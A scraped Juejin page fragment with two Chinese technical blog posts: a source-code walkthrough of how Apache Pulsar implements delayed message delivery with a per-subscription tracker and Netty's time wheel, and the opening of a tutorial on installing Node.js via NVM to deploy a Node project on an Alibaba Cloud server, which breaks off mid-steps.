100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">背景</h2>
<p>在我们的项目中，业务中常常需要解决定时提醒，定时发布等需求，而我们会常常使用pulsar的定时消息作为我们的定时处理的方案，而pulsar天然支持定时消息的发送。Pulsar 原生支持定时消息发送，因此在有空时，我就想深入研究一下它内部是如何实现定时消息机制的，写本文的初衷就是因为好奇。</p>
<p>本文将结合源码以及图示介绍pulsar定时消息的处理流程。</p>
<h2 data-id="heading-1">结合源码分析</h2>
<p>我们首先必须要明确一个概念：<strong>pulsar的延迟消息，是延迟投递到消费者</strong>。也就是说Producer 在发送消息时立即写入 Broker ，然后存储到 BookKeeper，延迟逻辑完全发生在 Broker 的消费路径。</p>
<p>第二个概念：
我们知道，当我们订阅一个topic时，我们会在broker上存储我们的订阅信息。</p>
<p>每个 Subscription 都有自己：</p>
<ul>
<li><strong>Cursor</strong>（订阅消费指针）</li>
<li><strong>Dispatcher</strong>（调度器）</li>
<li>延迟消息调度器 <strong>DelayedDeliveryTracker</strong>（按需创建，懒加载的，下文有源码）</li>
</ul>
<p>如何发送一个消息，如果我们自己使用pursal实现一个定时发布，会写出以下代码</p>
<pre><code class="hljs language-java" lang="java">producer.newMessage()
    .deliverAfter(<span class="hljs-number">10</span>, TimeUnit.SECONDS)
    .value(data)
    .send();
</code></pre>
<p>但其实本质上是 now + 10s，计算出过期时间，然后写入消息的deliverAtTimeStamp字段上</p>
<pre><code class="hljs language-java" lang="java">  <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> TypedMessageBuilder&lt;T&gt; <span class="hljs-title function_">deliverAt</span><span class="hljs-params">(<span class="hljs-type">long</span> timestamp)</span> {
        msgMetadata.setDeliverAtTime(timestamp);
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
    }
</code></pre>
<p><em>源码位置：
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fapache%2Fpulsar%2Fblob%2Fmaster%2Fpulsar-client%2Fsrc%2Fmain%2Fjava%2Forg%2Fapache%2Fpulsar%2Fclient%2Fimpl%2FTypedMessageBuilderImpl.java" target="_blank" title="https://github.com/apache/pulsar/blob/master/pulsar-client/src/main/java/org/apache/pulsar/client/impl/TypedMessageBuilderImpl.java" ref="nofollow noopener noreferrer">github.com/apache/puls…</a></em></p>
<p>然后消息在发送的时候会去<em>checkAndStartPublish</em></p>
<p>这个代码会初始化delayedDeliveryTracker，然后将消息放到delayedDeliveryTracker里面</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">trackDelayedDelivery</span><span class="hljs-params">(<span class="hljs-type">long</span> ledgerId, <span class="hljs-type">long</span> entryId, MessageMetadata msgMetadata)</span> {
        <span class="hljs-keyword">if</span> (!topic.isDelayedDeliveryEnabled()) {
            <span class="hljs-comment">// If broker has the feature disabled, always deliver messages immediately</span>
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }

        <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) {
            <span class="hljs-keyword">if</span> (delayedDeliveryTracker.isEmpty()) {
                <span class="hljs-keyword">if</span> (!msgMetadata.hasDeliverAtTime()) {
                    <span class="hljs-comment">// No need to initialize the tracker here</span>
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
                }

                <span class="hljs-comment">// Initialize the tracker the first time we need to use it</span>
                delayedDeliveryTracker = Optional.of(
                        topic.getBrokerService().getDelayedDeliveryTrackerFactory().newTracker(<span class="hljs-built_in">this</span>));
            }

            delayedDeliveryTracker.get().resetTickTime(topic.getDelayedDeliveryTickTimeMillis());

            <span class="hljs-comment">// 没有设置延时时间，则将延时时间设置为-1</span>
            <span class="hljs-type">long</span> <span class="hljs-variable">deliverAtTime</span> <span class="hljs-operator">=</span> msgMetadata.hasDeliverAtTime() ? msgMetadata.getDeliverAtTime() : -<span class="hljs-number">1L</span>;
            <span class="hljs-keyword">return</span> delayedDeliveryTracker.get().addMessage(ledgerId, entryId, deliverAtTime);
        }
    }
</code></pre>
<p>那么就有一个问题了，为什么没有延时的消息也会放在<em>delayedDeliveryTracker</em> 中呢？</p>
<p>继续往下看，我们到addMessage里面</p>
<p>这个地方，我们发现如果延时消息小于0，即当前没有延时消息，或者延时消息已经过期，则不放入，返回false，回到上一层</p>
<p><em>源码位置：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fapache%2Fpulsar%2Fblob%2Fmaster%2Fpulsar-broker%2Fsrc%2Fmain%2Fjava%2Forg%2Fapache%2Fpulsar%2Fbroker%2Fdelayed%2FInMemoryDelayedDeliveryTracker.java" target="_blank" title="https://github.com/apache/pulsar/blob/master/pulsar-broker/src/main/java/org/apache/pulsar/broker/delayed/InMemoryDelayedDeliveryTracker.java" ref="nofollow noopener noreferrer">github.com/apache/puls…</a></em></p>
<pre><code class="hljs language-java" lang="java"> <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">addMessage</span><span class="hljs-params">(<span class="hljs-type">long</span> ledgerId, <span class="hljs-type">long</span> entryId, <span class="hljs-type">long</span> deliverAt)</span> {
    
            <span class="hljs-comment">// 这一步判断，是否添加message(也就是ledgerId 和 entryId)到tracker</span>
        <span class="hljs-keyword">if</span> (deliverAt &lt; <span class="hljs-number">0</span> || deliverAt &lt;= getCutoffTime()) {
            messagesHaveFixedDelay = <span class="hljs-literal">false</span>;
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }

        <span class="hljs-keyword">if</span> (log.isDebugEnabled()) {
            log.debug(<span class="hljs-string">"[{}] Add message {}:{} -- Delivery in {} ms "</span>, dispatcher.getName(), ledgerId, entryId,
                    deliverAt - clock.millis());
        }

        <span class="hljs-type">long</span> <span class="hljs-variable">timestamp</span> <span class="hljs-operator">=</span> trimLowerBit(deliverAt, timestampPrecisionBitCnt);
        delayedMessageMap.computeIfAbsent(timestamp, k -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">Long2ObjectRBTreeMap</span>&lt;&gt;())
                .computeIfAbsent(ledgerId, k -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">Roaring64Bitmap</span>())
                .add(entryId);
        delayedMessagesCount.incrementAndGet();

        <span class="hljs-comment">// 这一步下面就是调用定时器，即时间轮</span>
        updateTimer();

        checkAndUpdateHighest(deliverAt);

        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
</code></pre>
<p>pulsar使用ledgerId + entryId定位一条消息，entryId是自增的，ledgerId是不重复的</p>
<p>接着上述方法的调用时间器的代码深入</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateTimer</span><span class="hljs-params">()</span> {

    <span class="hljs-comment">// 如果当前没有任何延迟消息</span>
    <span class="hljs-keyword">if</span> (getNumberOfDelayedMessages() == <span class="hljs-number">0</span>) {

        <span class="hljs-comment">// 如果之前已经设置了一个 timeout（计时任务），现在不需要了，取消掉</span>
        <span class="hljs-keyword">if</span> (timeout != <span class="hljs-literal">null</span>) {
            currentTimeoutTarget = -<span class="hljs-number">1</span>;  
            timeout.cancel();          
            timeout = <span class="hljs-literal">null</span>;
        }
        <span class="hljs-keyword">return</span>; 
    }

    <span class="hljs-comment">// 找到当前延迟队列中“下一条要被投递的消息”的 deliverAt 时间（最小时间戳）</span>
    <span class="hljs-type">long</span> <span class="hljs-variable">timestamp</span> <span class="hljs-operator">=</span> nextDeliveryTime();

    <span class="hljs-comment">// 如果这个 timestamp 和之前设定的目标时间一样，</span>
    <span class="hljs-comment">// 说明 timer 已经为这个时间点设置好了，不需要重复调度</span>
    <span class="hljs-keyword">if</span> (timestamp == currentTimeoutTarget) {
        <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// 如果之前已经设置了定时任务，但现在发现需要重新设置（如出现更早的延迟消息, 就先取消旧的 timeout</span>
    <span class="hljs-keyword">if</span> (timeout != <span class="hljs-literal">null</span>) {
        timeout.cancel();
    }

    <span class="hljs-type">long</span> <span class="hljs-variable">now</span> <span class="hljs-operator">=</span> clock.millis();

    <span class="hljs-comment">// 距离目标投递时间还有多久</span>
    <span class="hljs-type">long</span> <span class="hljs-variable">delayMillis</span> <span class="hljs-operator">=</span> timestamp - now;

    <span class="hljs-comment">// 如果 delay &lt; 0，说明消息已经到期，但仍未被发送给消费者, 所以直接return，dispatcher会处理掉</span>
    <span class="hljs-keyword">if</span> (delayMillis &lt; <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-type">long</span> <span class="hljs-variable">remainingTickDelayMillis</span> <span class="hljs-operator">=</span> lastTickRun + tickTimeMillis - now;

    <span class="hljs-comment">// 应该设置的 delay = max(消息实际 delay, tick 间隔 delay)</span>
    <span class="hljs-type">long</span> <span class="hljs-variable">calculatedDelayMillis</span> <span class="hljs-operator">=</span> Math.max(delayMillis, remainingTickDelayMillis);

    <span class="hljs-keyword">if</span> (log.isDebugEnabled()) {
        log.debug(<span class="hljs-string">"[{}] Start timer in {} millis"</span>,
                  dispatcher.getName(), calculatedDelayMillis);
    }

    currentTimeoutTarget = timestamp;

    <span class="hljs-comment">// 注册新的 timeout（即定时任务）到时间轮中</span>
    <span class="hljs-comment">// 到 calculatedDelayMillis 毫秒后，时间轮会回调 this.run() 或 checkAndTrigger()</span>
    timeout = timer.newTimeout(<span class="hljs-built_in">this</span>, calculatedDelayMillis, TimeUnit.MILLISECONDS);
}
</code></pre>
<p>当我们定位到timer时，我们会发现，其实就是用的netty的timer</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d44824214cd44cbd9751d8b9a3cf36dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2luY2VyZWx5cGx6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943003&amp;x-signature=HryH8r8CGZ4dXE93QNVSqbXfMNQ%3D" alt="QQ_1765335755320.png" loading="lazy"/></p>
<p>netty的时间轮在很多java相关的框架都有使用，比如redisson在实现看门狗的时候也是用的<em>Netty</em>的<em>HashedWheelTimer</em>， 还有dubbo。</p>
<p>时间轮每个broker是只有一个，这个我们可以看到timer在TrackerFactory中，即所有的Tracker队列 共享一个时间轮。</p>
<h2 data-id="heading-2">时间轮</h2>
<p>到底什么是时间轮呢？
我看了有一篇文章写的很好，非常通俗易懂，建议收藏。
<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F609284043" target="_blank" title="https://zhuanlan.zhihu.com/p/609284043" ref="nofollow noopener noreferrer">zhuanlan.zhihu.com/p/609284043</a></p>
<h2 data-id="heading-3">完整处理流程</h2>
<p>按照上述源码流程，我画了一个图来描述pulsar定时消息的图。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/643c0683dbc14d978bea96f89b30cb8c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2luY2VyZWx5cGx6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943003&amp;x-signature=nYZAE9FU7zIHw%2BdhoV5BNNoLrcA%3D" alt="image.png" loading="lazy"/></p>
<p>整个流程描述如下：</p>
<ol>
<li>Producer 发送消息时，会在消息的 metadata 中写入 deliverAt 时间（延迟投递时间）。<br/>
消息到达 Broker 后，Broker 会像普通消息一样立即将其持久化到 BookKeeper。</li>
<li>每个 Subscription 拥有自己的 Cursor。Cursor 会按顺序从 BookKeeper 读取该 Topic 的消息，并将读取到的消息交给 Dispatcher 处理。</li>
<li>Dispatcher 在处理消息时会解析 metadata：如果 deliverAt 大于当前时间，说明消息尚未到期。此时 Dispatcher 不会将消息投递给消费者，而是将其加入该订阅对应的延迟队列（DelayedDeliveryTracker）。</li>
<li>DelayedDeliveryTracker 会向 Broker 的全局时间轮（HashedWheelTimer）注册一个定时检查任务。Tracker 本身负责管理所有延迟消息的时间索引。</li>
<li>时间轮在每一次 tick 时会回调 Tracker，让 Tracker 自行判断哪些延迟消息已经到达投递时间。</li>
<li>一旦某条消息到期，Tracker 会将其调度回 Dispatcher，由 Dispatcher 再次从 BookKeeper 读取该消息，并按照订阅策略正常投递给消费者。</li>
</ol>
<h2 data-id="heading-4">参考</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F609284043" target="_blank" title="https://zhuanlan.zhihu.com/p/609284043" ref="nofollow noopener noreferrer">zhuanlan.zhihu.com/p/609284043</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fapache%2Fpulsar%2Ftree%2Fmaster%2Fpulsar-broker%2Fsrc%2Fmain%2Fjava%2Forg%2Fapache%2Fpulsar%2Fbroker" target="_blank" title="https://github.com/apache/pulsar/tree/master/pulsar-broker/src/main/java/org/apache/pulsar/broker" ref="nofollow noopener noreferrer">github.com/apache/puls…</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node项目部署到阿里云服务器]]></title>    <link>https://juejin.cn/post/7581761825482768420</link>    <guid>https://juejin.cn/post/7581761825482768420</guid>    <pubDate>2025-12-10T03:19:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581761825482768420" data-draft-id="7524712962072231951" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Node项目部署到阿里云服务器"/> <meta itemprop="keywords" content="前端,后端"/> <meta itemprop="datePublished" content="2025-12-10T03:19:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="南游"/> <meta itemprop="url" content="https://juejin.cn/user/1728872003943688"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Node项目部署到阿里云服务器
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1728872003943688/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    南游
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:19:52.000Z" title="Wed Dec 10 2025 03:19:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、服务器基础准备</h2>
<h3 data-id="heading-1">1.  服务器配置</h3>
<ul>
<li>购买云服务器（阿里云）</li>
<li>选择适合的操作系统（CentOS 7.9）</li>
<li>开放安全组端口：<code>22</code>(SSH)、<code>80</code>(HTTP)、<code>443</code>(HTTPS)、<code>你的应用端口</code>（如3000）</li>
</ul>
<h3 data-id="heading-2">2.  本地项目准备</h3>
<ul>
<li>确保项目在本地运行正常</li>
<li>清理 <code>node_modules</code> 和测试文件</li>
</ul>
<h2 data-id="heading-3">二、环境安装与配置</h2>
<h3 data-id="heading-4">1.  安装Node.js</h3>
<p>在Linux上部署Node.js，本文选择使用NVM（Node Version Manager）。与包管理器安装相比，NVM不受系统仓库版本限制，确保获取最新Node.js版本；与下载预编译二进制包相比，NVM省去了繁琐的环境变量配置；与从源代码编译安装相比，NVM大大缩短了安装时间，且对用户编译技能无要求。更重要的是，NVM支持多版本管理，方便切换，且安装的Node.js位于用户家目录，无需sudo权限，有效降低了安全风险。</p>
<ol>
<li>
<p><strong>安装分布式版本管理系统Git。</strong></p>
<p>Alibaba Cloud Linux 3/2、CentOS 7.x</p>
<pre><code class="hljs language-bash" lang="bash">sudo yum install git -y
</code></pre>
</li>
<li>
<p><strong>使用Git将NVM的源码克隆到本地的~/.nvm目录下，并检查最新版本。</strong></p>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> https://gitee.com/mirrors/nvm.git ~/.nvm &amp;&amp; <span class="hljs-built_in">cd</span> ~/.nvm &amp;&amp; git checkout `git describe --abbrev=0 --tags`
</code></pre>
</li>
<li>
<p><strong>依次运行以下命令，配置NVM的环境变量。</strong></p>
<pre><code class="hljs language-bash" lang="bash">sudo sh -c <span class="hljs-string">'echo ". ~/.nvm/nvm.sh" &gt;&gt; /etc/profile'</span>
<span class="hljs-built_in">source</span> /etc/profile
</code></pre>
</li>
<li>
<p><strong>运行以下命令，修改npm镜像源为阿里云镜像，以加快Node.js下载速度。</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">export</span> NVM_NODEJS_ORG_MIRROR=https://npmmirror.com/mirrors/node
</code></pre>
</li>
<li>
<p><strong>运行以下命令，查看Node.js版本。</strong></p>
<pre><code class="hljs language-bash" lang="bash">nvm list-remote
</code></pre>
</li>
<li>
<p><strong>安装多个Node.js版本。</strong></p>
<p>Alibaba Cloud Linux 2 和 CentOS 7.x 仅支持 Node.js 17.x 及以下版本，例如需要安装 v17.9.1，则执行nvm install v17.9.1。</p>
<pre><code class="hljs language-bash" lang="bash">nvm install v17.9.1
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1927db7a59e446a299f2a80b6cf17e14~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2X5ri4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941591&amp;x-signature=nZ5MeyNSCM2JxLxY7%2FOwyd1CKUM%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a8db54b6e9da4281ae6c18ec18e39603~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2X5ri4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941591&amp;x-signature=xD5JmgSq8ptL7At64sRqJVa8M74%3D" alt="image.png" loading="lazy"/></p>
</li>
<li>
<p><strong>查看已安装的Node.js版本。</strong></p>
<pre><code class="hljs language-bash" lang="bash">nvm <span class="hljs-built_in">ls</span>
</code></pre>
